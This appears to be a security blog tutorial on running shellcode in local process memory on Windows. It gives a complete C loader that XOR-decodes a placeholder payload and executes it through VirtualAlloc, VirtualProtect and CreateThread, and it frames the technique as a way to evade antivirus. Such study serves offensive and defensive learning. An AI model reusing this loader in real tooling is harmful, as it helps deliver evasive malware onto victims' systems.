<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Local Payload Execution - pwn3rx0</title>
  <meta name="description" content="A technical guide on executing binary payloads directly in a local process's memory space using VirtualAlloc, VirtualProtect, and CreateThread.">
  <meta name="keywords" content="malware-development, shellcode, evasion, win-api, memory-management, cybersecurity, security, writeups, ctf, pentest, penetration testing, red team, red teaming, malware, malware development, windows internals, windows api, payload, injection, active directory, ad, ad enumeration, kerberoasting, lateral movement, post exploitation, defense evasion, opsec, privilege escalation, blue team, incident response, andrew mamdouh, pwn3rx0, andrew_mamdouh, malware dev, execution">
  <meta name="author" content="Andrew Mamdouh (pwn3rx0)">
  <link rel="canonical" href="/writeups/Malware DEV/Execution/Local Payload Execution/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta property="og:title" content="Local Payload Execution">
  <meta property="og:description" content="A technical guide on executing binary payloads directly in a local process's memory space using VirtualAlloc, VirtualProtect, and CreateThread.">
  <meta property="og:type" content="article">
  <meta property="og:site_name" content="pwn3rx0 blog">
  <meta property="og:image" content="/assets/images/og-home.png">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:url" content="/writeups/Malware DEV/Execution/Local Payload Execution/">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Local Payload Execution">
  <meta name="twitter:description" content="A technical guide on executing binary payloads directly in a local process's memory space using VirtualAlloc, VirtualProtect, and CreateThread.">
  <meta name="twitter:image" content="/assets/images/og-home.png">
  <meta name="site-base" content="/">
  <link rel="stylesheet" href="/assets/css/styles.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.9.0/styles/github-dark.min.css">
  <link rel="icon" href="/assets/icons/favicon.svg" type="image/svg+xml">
  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon" sizes="any">
</head>
<body>
  <div class="app-container">
    <aside class="sidebar">
      <div class="profile-card">
        <div class="avatar">
          <img src="/assets/images/profile.jpg" alt="Andrew Mamdouh">
        </div>
        <div class="profile-name">Andrew Mamdouh</div>
        <div class="profile-nick" style="color:#8a8f98;">(pwn3rx0)</div>
        <nav class="social-tabs">
          <a class="chip" href="https://github.com/pwn3rx0">GitHub</a>
          <a class="chip" href="https://www.linkedin.com/in/andrew-mamdouh122">LinkedIn</a>
          <a class="chip" href="https://x.com/pwn3rx0">X</a>
        </nav>
      </div>
      <nav class="category-tree"></nav>
    </aside>
    <main class="main-content">
      <nav class="breadcrumbs">
      
      <a href="/">Home</a>
    
      <span class="separator">/</span>
      <a href="/category/Malware DEV/">Malware DEV</a>
    
      <span class="separator">/</span>
      <a href="/category/Malware DEV/Execution/">Execution</a>
    
      <span class="separator">/</span>
      <span class="current">Local Payload Execution</span>
    </nav>
      <article class="writeup">
        <header>
          <h1>Local Payload Execution</h1>
          <div class="writeup-meta">
            <div class="writeup-date">date: <time datetime="February 24, 2026 at 02:00 AM">February 24, 2026 at 02:00 AM</time></div>
            <div class="tags-row">
              <div class="tags-label">tags:</div>
              <div class="tags"><span class="tag">malware-development</span><span class="tag">shellcode</span><span class="tag">evasion</span><span class="tag">win-api</span><span class="tag">memory-management</span></div>
            </div>
            
          </div>
        </header>
        <div class="writeup-content"><p>is a technique used to run a binary payload (often shellcode) directly within the memory space of a process on a local machine. This method is common in offensive security for executing code without writing it to disk, reducing the chance of detection by antivirus or endpoint protection solutions.</p>
<hr>
<h2>Code Example: Local Payload Execution in C</h2>
<pre><code class="language-c">#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

// Function to decode or prepare shellcode (details abstracted here)
BOOL XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
    for (size_t i = 0, j = 0; i &lt; sShellcodeSize; i++, j++) {
        if (j &gt;= sKeySize) {
            j = 0;
        }
        pShellcode[i] = pShellcode[i] ^ bKey[j];
    }
    return TRUE;
}

unsigned char XorKey[] = { /* key bytes */ };

int main() {
    unsigned char cipherText[] = { /* encrypted payload bytes */ };
    SIZE_T sDSize = sizeof(cipherText);

    // Step 1: Decode payload
    if (!XorByInputKey(cipherText, sDSize, XorKey, sizeof(XorKey))) {
        return -1;
    }

    // Step 2: Allocate memory for payload
    PVOID pShellCodeAddres = VirtualAlloc(NULL, sDSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pShellCodeAddres) {
        return -1;
    }

    // Step 3: Copy payload to allocated memory
    memcpy(pShellCodeAddres, cipherText, sDSize);
    memset(cipherText, &#39;\0&#39;, sDSize);  // Clear original buffer

    // Change memory protection to executable
    DWORD dwOldProtect = 0;
    if (!VirtualProtect(pShellCodeAddres, sDSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect)) {
        VirtualFree(pShellCodeAddres, 0, MEM_RELEASE);
        return -1;
    }

    // Step 4: Execute payload in a new thread
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellCodeAddres, NULL, 0, NULL);
    if (!hThread) {
        VirtualFree(pShellCodeAddres, 0, MEM_RELEASE);
        return -1;
    }

    // Wait for payload execution to finish
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    // Step 5: Free allocated memory
    VirtualFree(pShellCodeAddres, 0, MEM_RELEASE);

    return 0;
}
</code></pre>
<h2>Key Steps in Local Payload Execution</h2>
<h3>1. Preparation of Payload</h3>
<ul>
<li>The payload is stored in memory, often in an encoded or obfuscated form.</li>
<li>It must be decoded or decrypted in-memory before execution (this step is necessary but secondary to execution itself).</li>
</ul>
<h3>2. Memory Allocation</h3>
<ul>
<li>The Windows API function <code>VirtualAlloc</code> is used to allocate memory with specific flags.<ul>
<li><code>MEM_COMMIT | MEM_RESERVE</code>: Reserves and commits memory.</li>
<li><code>PAGE_READWRITE</code>: Allows the memory to be written to initially.</li>
</ul>
</li>
<li>The allocated memory must be large enough to hold the entire payload.</li>
</ul>
<h3>3. Copying Payload to Executable Memory</h3>
<ul>
<li>The decoded payload is copied into the allocated memory.</li>
<li>After copying, the memory protection is changed using <code>VirtualProtect</code> to:<ul>
<li><code>PAGE_EXECUTE_READWRITE</code>: Allows the payload to be executed from this memory region.</li>
</ul>
</li>
<li>Changing memory permissions is crucial since many systems mark writable memory as non-executable by default to prevent code injection attacks.</li>
</ul>
<h3>4. Executing the Payload</h3>
<ul>
<li>A new thread is created using <code>CreateThread</code>, with the starting routine set to the address of the allocated memory containing the payload.</li>
<li>This allows the payload to run asynchronously within the same process.</li>
<li>The main thread waits for the payload thread to finish execution using <code>WaitForSingleObject</code>.</li>
</ul>
<h3>5. Cleanup</h3>
<ul>
<li>After execution, allocated memory is freed using <code>VirtualFree</code>.</li>
<li>Sensitive data buffers are cleared (e.g., zeroing the payload buffer) to minimize traces in memory.</li>
</ul>
<hr>
</div>
        <nav class="post-navigation">
          <span class="nav-link disabled"><span class="nav-direction">← Previous</span><span class="nav-title">No older post</span></span>
          
      <a href="/writeups/Malware DEV/Execution/APC Injection/" class="nav-link next-post">
        <span class="nav-direction">Next →</span>
        <span class="nav-title">APC Injection</span>
      </a>
    
        </nav>
        
      <aside class="related-posts">
        <h3>Related Writeups</h3>
        <ul class="related-list">
          <li><a href="/writeups/Malware DEV/Obfuscation/To IPs/">IPv4 Masquerading (Obfuscation)</a></li><li><a href="/writeups/Malware DEV/Payload Placement/Staged/HTTP Stageing/">HTTP Stager & Remote Payload Delivery</a></li><li><a href="/writeups/Malware DEV/Encryption/Encryption/">Shellcode Obfuscation & Encryption</a></li>
        </ul>
      </aside>
    
      </article>
    </main>
  </div>
  <button class="mobile-menu-toggle">☰</button>
  <script src="/assets/js/main.js"></script>
  <script src="/assets/js/navigation.js"></script>
  <script>
    window.MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']],
        displayMath: [['$$','$$'], ['\\[','\\]']]
      },
      svg: { fontCache: 'global' }
    };
  </script>
  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js" defer></script>
  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js" defer></script>
  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/highlight.min.js" defer></script>
  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/c.min.js" defer></script>
  <script>(function(){function _0x47d239(_0x4f4d87){const _0x4af52a=_0x4f4d87||document['querySelector']('.writeup-content')||document,_0xa51cc=Array['from'](_0x4af52a['querySelectorAll']('pre\x20>\x20code'))['filter'](_0x5300d5=>!_0x5300d5['closest']('.code-block'));_0xa51cc['forEach'](_0x33bea1=>{const _0x5ee206=_0x33bea1['parentElement'];if(!_0x5ee206||_0x5ee206['dataset']['enhanced']==='true')return;_0x5ee206['dataset']['enhanced']='true';let _0x4466be=Array['from'](_0x33bea1['classList']||[])['find'](_0x45ea28=>_0x45ea28['startsWith']('language-'));if(!_0x4466be){const _0xf0656=_0x33bea1['textContent']||'';(/#include\s+<[^>]+>/['test'](_0xf0656)||/\bint\s+main\s*\(/['test'](_0xf0656)||/#include\s+<Windows\.h>/i['test'](_0xf0656))&&(_0x33bea1['classList']['add']('language-c'),_0x4466be='language-c');}const _0x16e157=(_0x4466be?_0x4466be['replace']('language-',''):'text')['toUpperCase'](),_0x3eb7c6=document['createElement']('div');_0x3eb7c6['className']='code-block';const _0x4408aa=document['createElement']('div');_0x4408aa['className']='code-header';const _0x5d0bf3=document['createElement']('span');_0x5d0bf3['className']='code-lang',_0x5d0bf3['textContent']=_0x16e157;const _0x8c21cb=document['createElement']('button');_0x8c21cb['className']='code-copy',_0x8c21cb['type']='button',_0x8c21cb['textContent']='Copy',_0x8c21cb['addEventListener']('click',async()=>{const _0x1d0bbc=_0x33bea1['innerText'],_0xbc8784=()=>{const _0x42cbe9=document['createElement']('textarea');_0x42cbe9['value']=_0x1d0bbc,_0x42cbe9['style']['position']='fixed',_0x42cbe9['style']['opacity']='0',_0x42cbe9['style']['left']='-9999px',document['body']['appendChild'](_0x42cbe9),_0x42cbe9['focus'](),_0x42cbe9['select']();try{document['execCommand']('copy'),_0x8c21cb['textContent']='Copied';}catch(_0x2fa7a3){_0x8c21cb['textContent']='Failed';}finally{document['body']['removeChild'](_0x42cbe9),setTimeout(()=>_0x8c21cb['textContent']='Copy',0x4b0);}};try{navigator['clipboard']&&window['isSecureContext']?(await navigator['clipboard']['writeText'](_0x1d0bbc),_0x8c21cb['textContent']='Copied',setTimeout(()=>_0x8c21cb['textContent']='Copy',0x4b0)):_0xbc8784();}catch(_0xad70c1){_0xbc8784();}}),_0x4408aa['appendChild'](_0x5d0bf3),_0x4408aa['appendChild'](_0x8c21cb);const _0x21106e=document['createElement']('div');_0x21106e['className']='code-content',_0x5ee206['replaceWith'](_0x3eb7c6),_0x21106e['appendChild'](_0x5ee206),_0x3eb7c6['appendChild'](_0x4408aa),_0x3eb7c6['appendChild'](_0x21106e);if(window['hljs']&&typeof window['hljs']['highlightElement']==='function')window['hljs']['highlightElement'](_0x33bea1);else window['hljs']&&typeof window['hljs']['highlightAll']==='function'&&window['hljs']['highlightAll']();});}function _0x1eee92(_0x497a91){const _0x3a00db=_0x497a91||document['querySelector']('.writeup-content');if(!_0x3a00db)return;const _0x5ca717=_0x3a00db['querySelectorAll']('h1,h2,h3,h4,h5,h6');_0x5ca717['forEach'](_0xaf0c45=>{const _0x176bac=parseInt(_0xaf0c45['tagName']['substring'](0x1),0xa);let _0x413a39=_0xaf0c45['nextElementSibling'];while(_0x413a39){if(/^H[1-6]$/['test'](_0x413a39['tagName'])){const _0x59251b=parseInt(_0x413a39['tagName']['substring'](0x1),0xa);if(_0x59251b<=_0x176bac)break;}_0x413a39['tagName']==='P'&&_0x413a39['classList']['add']('indent-p'),_0x413a39=_0x413a39['nextElementSibling'];}});}function _0x282465(){window['mermaid']&&mermaid['initialize']({'startOnLoad':!![],'theme':'dark'});_0x47d239(),_0x1eee92();window['hljs']&&typeof window['hljs']['highlightAll']==='function'&&window['hljs']['highlightAll']();const _0x1bbd52=document['querySelector']('.writeup-content');if(_0x1bbd52&&window['MutationObserver']){const _0x541c69=new MutationObserver(()=>{_0x47d239(_0x1bbd52),_0x1eee92(_0x1bbd52),window['hljs']&&typeof window['hljs']['highlightAll']==='function'&&window['hljs']['highlightAll']();});_0x541c69['observe'](_0x1bbd52,{'childList':!![],'subtree':!![]});}}window['addEventListener']('load',_0x282465);}());</script>
</body>
</html>
